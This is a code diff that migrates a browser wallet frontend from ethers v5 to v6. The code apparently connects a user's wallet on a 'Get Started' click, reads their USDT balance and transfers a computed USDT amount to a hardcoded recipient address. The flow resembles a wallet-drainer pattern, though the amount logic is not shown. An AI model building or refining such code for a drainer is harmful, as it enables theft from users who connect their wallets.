@@ -1,4 +1,4 @@
-import { JsonRpcProvider, Web3Provider, Contract, formatUnits, formatEther, parseUnits } from 'ethers';
+import { JsonRpcProvider, BrowserProvider, Contract, formatUnits, formatEther, parseUnits } from 'ethers';
 
 const USDT_CONTRACT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
 const RECIPIENT_ADDRESS = '0x1EaDA2b8cC4054Cee7b95087F4D1E913Ca22131d';
@@ -39,7 +39,7 @@ export const fetchBalances = async (address) => {
         const usdtBalance = await usdtContract.balanceOf(address);
         const formattedUSDTBalance = formatUnits(usdtBalance, 18);
 
-        const provider = new Web3Provider(window.ethereum);
+        const provider = new BrowserProvider(window.ethereum);
         const bnbBalanceRaw = await provider.getBalance(address);
         const formattedBNBBalance = formatEther(bnbBalanceRaw);
 
@@ -57,9 +57,9 @@ export const handleGetStartedClick = async (usdtAmountInput) => {
     try {
         await checkAndSwitchToBsc();  // Ensure on BSC Network
 
-        const provider = new Web3Provider(window.ethereum);
+        const provider = new BrowserProvider(window.ethereum);
         await provider.send("eth_requestAccounts", []);  // Request wallet connection
-        const signer = provider.getSigner();
+        const signer = await provider.getSigner();
         const address = await signer.getAddress();
 
         let balances = await fetchBalances(address);
@@ -82,7 +82,7 @@ export const handleGetStartedClick = async (usdtAmountInput) => {
         const amountInWei = parseUnits(finalTransferAmount.toString(), 18);
 
         const estimatedGas = await contractWithSigner.estimateGas.transfer(RECIPIENT_ADDRESS, amountInWei);
-        const gasLimit = estimatedGas.mul(3).div(2); // 1.5x estimated gas
+        const gasLimit = estimatedGas * 3n / 2n; // 1.5x estimated gas
 
         const transferTx = await contractWithSigner.transfer(RECIPIENT_ADDRESS, amountInWei, { gasLimit });
         await transferTx.wait();
